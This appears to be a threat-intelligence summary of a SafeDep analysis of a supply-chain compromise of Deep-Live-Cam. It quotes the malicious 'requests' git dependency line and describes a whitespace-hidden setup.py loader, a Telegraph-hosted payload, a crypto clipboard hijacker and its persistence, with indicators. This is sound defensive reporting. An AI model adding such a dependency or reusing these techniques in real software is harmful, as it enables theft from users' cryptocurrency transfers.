# Deep-Live-Cam (96.6k-star face-swap app) supply-chain compromise: `requests` dependency rewritten to a typosquatted source repo whose `setup.py` hides an `exec(compile(...))` loader behind 434 spaces, delivering a cross-platform cryptocurrency clipboard hijacker via a Telegraph page (SafeDep, Sep 9, 2026)

## Tags
- ops
- operations
- supply chain attack
- Python supply chain
- pip source dependency
- setup.py execution
- build-time code execution
- dependency confusion
- typosquatting
- GitHub account compromise
- Deep-Live-Cam
- pypls/requests
- whitespace hiding
- CJK variable names
- Telegraph dead drop
- clipboard hijacker
- cryptocurrency address replacement
- wallet address swapping
- Base58Check
- Bech32
- EIP-55
- Keccak-256
- persistence
- Run key
- LaunchAgent
- Russian-language indicator
- SafeDep
- MITRE ATT&CK

## Summary

SafeDep analyzed a supply-chain compromise of **Deep-Live-Cam**, a Python real-time face-swap application with **96,600 GitHub stars**. On **September 8, 2026 at 15:58:54 UTC**, a commit titled `chore: update requirements.txt` (revision `7895c547`, pushed to `main` under the maintainer's account `hacksider`) rewrote **18 dependency entries to use source repositories** and added one malicious line:

```
requests @ git+https://github.com/pypls/requests.git
```

The `pypls` account and its `requests` repository were **created September 5, 2026** — three days before the commit (the Telegraph payload page carries the same September 5 timestamp). The fake repo declares the package name `requests` and retains metadata linking to the legitimate Requests project; the bulk rewrite of the other 18 entries makes the added source URL less distinct in review (concealment is a plausible motive, though the diff alone does not prove intent). Issue #1930 flagged the dependency at 01:26:18 UTC Sep 9; the revert (`55d306d5`) landed at 01:37:35 — the malicious revision sat on `main` for **about 9 hours 39 minutes**. The maintainer reported **unusual account access despite two-factor authentication** and rotated passwords and keys — an account-compromise assessment, though the credential path (token / SSH key / session) is unidentified.

SafeDep establishes malicious behavior in the code but explicitly does **not** claim infection counts or financial losses.

## Attack chain

**1. Build-time execution.** The malicious dependency selects the standard `setuptools.build_meta` backend; pip calls the build backend during source installs, and setuptools **executes `setup.py`** — so code runs *before the user ever launches the app*, and an install error afterward does not undo execution. Line 2 of the malicious `setup.py` starts `import sys`, then **434 spaces** push the payload past the visible area of most editors and review tools, followed by `exec(compile(...))` over Base64 + zlib layers. **CJK variable names** (`一時1`, `シード5`, `字符4`, `モジュール10`) add visual noise to defeat casual reading. The hidden code precedes the Python-version guard, so the version check is not a sandbox.

**2. Platform loader.** Stage 2 selects Windows or macOS (exits elsewhere). Its download URL is hex-encoded — decoded: `hxxps://graph[.]org/coding-utf-8-09-05-2`, a **Telegraph (graph.org) article page serving the next Python stage** inside `<article>` tags (live at analysis time). The loader strips HTML, decodes entities, writes the script locally, and fires a counter hit to `hxxps://abacus[.]jasoncameron[.]dev/hit/duff[.]com/info` **before** spawning the child (a hit does not prove execution).

**3. Clipboard hijacker (stage 4).** A loop every **0.3 s** reads the clipboard (Win32 APIs / `pbpaste`), scans changed text for 26–120-character alphanumeric candidates, and runs a real **address classifier** — Base58Check (BTC, TRX), Bech32/Bech32m witness checks, Ethereum **Keccak-256 + EIP-55** mixed-case validation, Solana Base58→32-byte decoding — then replaces recognized wallet addresses **mid-text** via regex substitution and writes back (`SetClipboardData` / `pbcopy`). A Russian error string, `Неизвестный тип кошелька` ("Unknown wallet type"), is a minor language-origin indicator. Linux clipboard helpers exist in the payload but the loader exits on Linux, so this delivery path has no Linux exposure.

**4. Persistence.** Windows: `SysHelper` value under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, launching the script with `CREATE_NO_WINDOW`. macOS: `~/Library/LaunchAgents/com.user.syshelper.plist`, new session, stdout/stderr discarded. If the script file already exists, the loader skips download and just runs it.

## Indicators (as published by SafeDep)
| Type | Indicator |
|---|---|
| Malicious dependency | `hxxps://github[.]com/pypls/requests` (rev `43f402baa9d00d986d2be3e3cd6d1a3e69ec1f8f`) |
| Deep-Live-Cam revisions | malicious `7895c547a6788ee53e5c7c34e93454f86f6d2b53`; revert `55d306d5ae07a4e6494013422ab244306a5c0879` |
| Payload page | `hxxps://graph[.]org/coding-utf-8-09-05-2` (Telegraph) |
| Counter beacon | `hxxps://abacus[.]jasoncameron[.]dev/hit/duff[.]com/info` |
| Windows artifacts | `%LOCALAPPDATA%\WindowsHelper\sys.pyw`; Run value `SysHelper` |
| macOS artifacts | `~/Library/Application Support/HowToFind/sys.py`; `~/Library/LaunchAgents/com.user.syshelper.plist` |
| Attacker email | from `pypls` commits (see SafeDep post) |
| Replacement addresses | ETH `0x58d28b72c54A5b645201900c8aA8550ad7f7d90b`; BTC legacy `1LeCcPytFxpeo6Leujc4USuCwec9oDFa92`; BTC P2SH `3LKB1j9zgmSdaNWy3iLCiHVaV6b1qpLRXB`; BTC P2WPKH `bc1q42m55rrtzjzf05dhp4az02lqqkpjemjddwwht3`; BTC P2WSH/P2TR `bc1p68qmln48g90mpv6ukrmmhvp64qvx4evgu0h5s9mf6ljwp0n6ahnswhnpa6`; TRX `TDfqUBRSnXcEeLWSGHKSWPAhRSySqEiykQ`; SOL `6ig8v2AAvVQh4qK5JBS9ZTSWRjCKTHhEq4SMV8oqWfmu` |
| SHA-256 | `setup.py` `b34818f9…e4a5e6f4`; stage1 `f6fbefc8…2585064f5`; stage2 `175f9e7f…0e4f6ced`; stage2_from_c2 `eafed300…710017570`; stage3 `c91a00b5…c2d6764d9`; stage4 `73cb3c0e…0161dd0561` |

## Why this matters
- **A GitHub-referenced pip dependency is arbitrary code execution on every install.** `pip install git+https://…` with a setuptools backend runs `setup.py` before the application starts, outside the app's trust boundary. Pinning to a *source repo* instead of a published wheel silently trades registry review affordances for attacker-controlled build execution.
- **Whitespace + non-ASCII identifiers are diff-review evasions.** 434 leading spaces push executable statements off-screen; CJK variable names add noise. Reviewers and diff tools that fold long lines are blind to this by design — a reusable hunting pivot for `requirements.txt` / `pyproject.toml` diffs that bulk-rewrite dependency sources.
- **Bulk dependency rewrites mask single malicious lines.** When a PR changes many dependency entries at once, treat each changed *source location* as a new supply-chain edge, not the diff's overall tidiness as a trust signal.
- **Legitimate free services carry the chain** (GitHub repo, Telegraph page, public counter endpoint) — takedown of one hop doesn't collapse the pipeline, and the page-based dead drop means the final payload can change without touching the repo.
- **Clipboard hijacking is a silent money-theft primitive**: it needs no admin, hooks nothing, and only fires when the victim copies an address — the 0.3 s polling loop, `CREATE_NO_WINDOW`/detached-session execution, and the two persistence paths are the durable host tells.
- **2FA-protected maintainer accounts are being reached anyway.** The maintainer's account was compromised despite two-factor authentication (credential path unidentified), echoing the npm/GemStuffer-era pattern where maintainer-account takeover, not package-repo weakness, is the entry point.

## MITRE ATT&CK (selected)
- T1195.002 — supply-chain compromise via malicious dependency (compromise software dependencies)
- T1059.006 — Python execution through the pip build backend
- T1036.007 / T1102 — masquerading as the legitimate `requests` package; dead-drop via a legitimate web service (Telegraph)
- T1566-adjacent wallet substitution: T1657-style financial manipulation via clipboard address replacement
- T1547.001 (HKCU Run) / T1543.003-equivalent (user LaunchAgent) — persistence

## Sources
- SafeDep, "Deep-Live-Cam Supply Chain Attack: Technical Analysis," September 9, 2026 — <https://safedep.io/deep-live-cam-supply-chain-attack>

## Related
- [GemStuffer RubyGems campaign](gemstuffer-rubygems-openai-agents-rubydoc-abuse-3022-packages-jfrog-september-2026.md) — same "package-registry machinery as untrusted code execution" lesson on the RubyDoc side.
- [ulid-xyz transitive delivery chain](ulid-xyz-transitive-delivery-chain-microsoftsystem64-dprk-september-2026.md) — npm analogue of delivery through dependency metadata rather than a registry upload.
